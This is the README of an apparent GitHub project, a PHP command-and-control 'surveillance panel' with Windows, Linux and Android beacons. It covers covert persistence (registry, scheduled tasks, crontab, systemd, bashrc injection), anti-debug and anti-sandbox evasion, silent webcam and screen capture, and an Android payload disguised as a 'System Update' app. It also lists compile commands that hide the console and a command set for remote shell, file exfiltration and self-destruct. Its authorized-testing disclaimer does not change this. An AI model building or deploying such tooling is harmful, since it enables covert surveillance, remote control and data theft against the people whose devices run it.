# C2 Surveillance Panel

A PHP-based command and control panel with multi-platform beacon support (Windows, Linux, Android). Built for authorized red team operations and security research.

> **Warning:** This tool is for authorized security testing only. Only use on systems you own or have explicit written authorization to test.

---

## Features

### Web Panel

- Dark themed responsive UI with AJAX login
- Real-time device tracking with active/dead status
- Full terminal with command history
- Remote file browser with upload and download
- Screenshot and camera photo viewer
- Per-device notes and operator profiles
- OS-aware quick action buttons
- CSRF protection, rate limiting, bcrypt passwords

### Windows Beacons

Two variants available:

- **beacon_persist.c** - Operator-triggered persistence. Run the exe, it phones home. You send the persist command from the panel when ready.
- **beacon_auto.c** - Auto-persists on first execution. No operator action needed.

Both support: shell commands, process listing, file browser, upload/download, screenshot, webcam capture, registry and startup folder persistence, scheduled task persistence, anti-debug, anti-sandbox, runtime API resolution, and self-destruct.

### Linux Beacon

- **beacon_linux.c** - Daemonizes to background on execution.

Supports: shell commands, process listing, file browser, upload/download, crontab persistence, systemd user service, init.d persistence, bashrc injection, anti-debug, anti-sandbox, and self-destruct.

### Android Beacon

- **BeaconService.java** - Foreground service with headless camera capture and MediaProjection screenshots.
- Disguised as "System Update" (package: com.sysupdate.ota).
- Survives reboot via boot receiver.
- One-time screen capture consent, then reused silently.

---

## Installation

### 1. Deploy the Panel

Copy the githubVERSION directory to your web server:

    git clone https://github.com/0xMush/surveillanceC2.git
    cd surveillanceC2

Or copy githubVERSION/ into your Apache htdocs directory.

### 2. Run Setup

Open in your browser:

    http://yourserver/setup.php

Or run from command line:

    php setup.php

Setup will generate secrets, create directories, initialize the database, and create your admin account.

### 3. Delete setup.php

After setup completes, delete setup.php for security.

### 4. Login

Open the panel URL and login with the credentials from setup.

---

## Compiling Beacons

### Configuration

Before compiling, edit the config in each beacon source file and replace the placeholder values with your server IP and BEACON_SECRET (from .env).

For C beacons (Windows/Linux):

    #define CFG_HOST    "YOUR_SERVER_IP"
    #define CFG_PORT    "8080"
    #define CFG_SECRET  "YOUR_BEACON_SECRET_HERE"

For Android (Config.java):

    public static final String HOST = "YOUR_SERVER_IP";
    public static final int PORT = 8080;
    public static final String SECRET = "YOUR_BEACON_SECRET_HERE";

### Windows

Requires MinGW-w64 with gcc in PATH.

    gcc -o beacon.exe beacon_persist.c -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s

    gcc -o beacon.exe beacon_auto.c -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s

The -lws2_32 flag provides Winsock for HTTP. The -lgdi32 flag provides GDI for screenshots. The -lvfw32 flag provides Video for Windows for webcam capture. The -mwindows flag hides the console window.

### Linux

Requires GCC on the target system or a cross-compiler.

    gcc -o beacon beacon_linux.c -s -Os

The -s flag strips symbols. The -Os flag optimizes for size.

### Android

Requires JDK 17 and Android SDK (build-tools 34, platform android-34).

**Using Android Studio:**

1. Open payload/android/ in Android Studio
2. Edit Config.java with your server details
3. Build, Generate Signed APK, use release.keystore (password: android)

**Using command line:**

    aapt2 compile -o compiled/ res/values/strings.xml
    aapt2 link -o proto.apk --manifest AndroidManifest.xml -I android.jar --java gen compiled/*.flat
    javac -source 11 -target 11 -classpath android.jar -d obj/ gen/**/*.java app/src/main/java/**/*.java
    d8 --lib android.jar --output dex/ obj/**/*.class
    cp proto.apk unsigned.apk
    # Add classes.dex to unsigned.apk (zip tool)
    apksigner sign --ks release.keystore --ks-pass pass:android --ks-key-alias key0 --out beacon.apk unsigned.apk

---

## Command Reference

### Common Commands (All Platforms)

    ping              - Check if beacon is alive
    hostname          - Get device info (model, OS, user)
    ps                - List running processes
    drives            - List storage devices and partitions
    shell <cmd>       - Execute a shell command
    die               - Stop the beacon process
    selfdestruct      - Remove all persistence and data

### File Operations

    browse <path>     - List directory contents
    read <file>       - Read file contents
    pull <file>       - Upload a file to the C2 server
    push <id> <path>  - Download a file from C2 to the device
    delete <path>     - Delete a file or directory

### Windows and Linux

    ifconfig          - Show network interfaces and IP
    screenshot        - Capture the screen
    camera            - Capture webcam (Windows only)
    persist           - Enable persistence mechanisms

### Android

    ifconfig          - Show network interfaces
    cam back          - Capture photo with rear camera
    cam front         - Capture photo with front camera
    ss                - Capture screenshot (requires one-time consent)
    persist           - Enable battery exemption, overlay permission, foreground service, and boot receiver

---

## Project Structure

    api.php                      API entry point
    index.php                    Panel UI and login gate
    setup.php                    One-time setup wizard
    .env.example                 Environment template
    .htaccess                    Apache rewrite rules and security headers
    assets/
      panel.js                   Panel JavaScript
      panel.css                  Dark theme stylesheet
    handlers/
      auth.php                   Login and logout
      beacon.php                 Beacon checkin and task dispatch
      task.php                   Task creation and listing
      result.php                 Task result handling
      file.php                   File upload and download
      filebrowser.php            Browse cache and directory requests
      media.php                  Screenshot and camera upload
      device.php                 Device management
      payload.php                Payload generation
      persons.php                Human profiles
    includes/
      config.php                 Environment loader and constants
      auth.php                   Session management and CSRF
      db.php                     JSON file-based database
      helpers.php                Utility functions
      router.php                 Request routing
    payload/
      windows/
        beacon_persist.c         Windows beacon with manual persistence
        beacon_auto.c            Windows beacon with auto persistence
      linux/
        beacon_linux.c           Linux beacon
      android/                   Full Android project source
        AndroidManifest.xml
        build.gradle
        release.keystore
        app/src/main/java/com/sysupdate/ota/
          BeaconService.java     Core beacon service
          BootReceiver.java      Auto-start on boot
          Config.java            Server configuration
          MainActivity.java      Permission requests
          PermissionActivity.java Permission prompt dialogs
          ScreenshotActivity.java Screenshot consent
    data/                        Runtime database (created by setup)
    uploads/                     File storage (created by setup)

---

## Security Notes

- The .env file is gitignored and never committed to the repository
- The data/ and uploads/ directories are gitignored so no device data is ever in the repo
- All beacon source files use placeholder values for server IP and secret
- The panel uses bcrypt password hashing and CSRF token protection
- Login is rate limited to 8 failed attempts per 10 minutes per IP
- Apache .htaccess blocks direct access to data/, includes/, handlers/, and .env
- Beacon communication uses Bearer token authentication with the BEACON_SECRET

---

## License

For authorized security testing and educational purposes only.
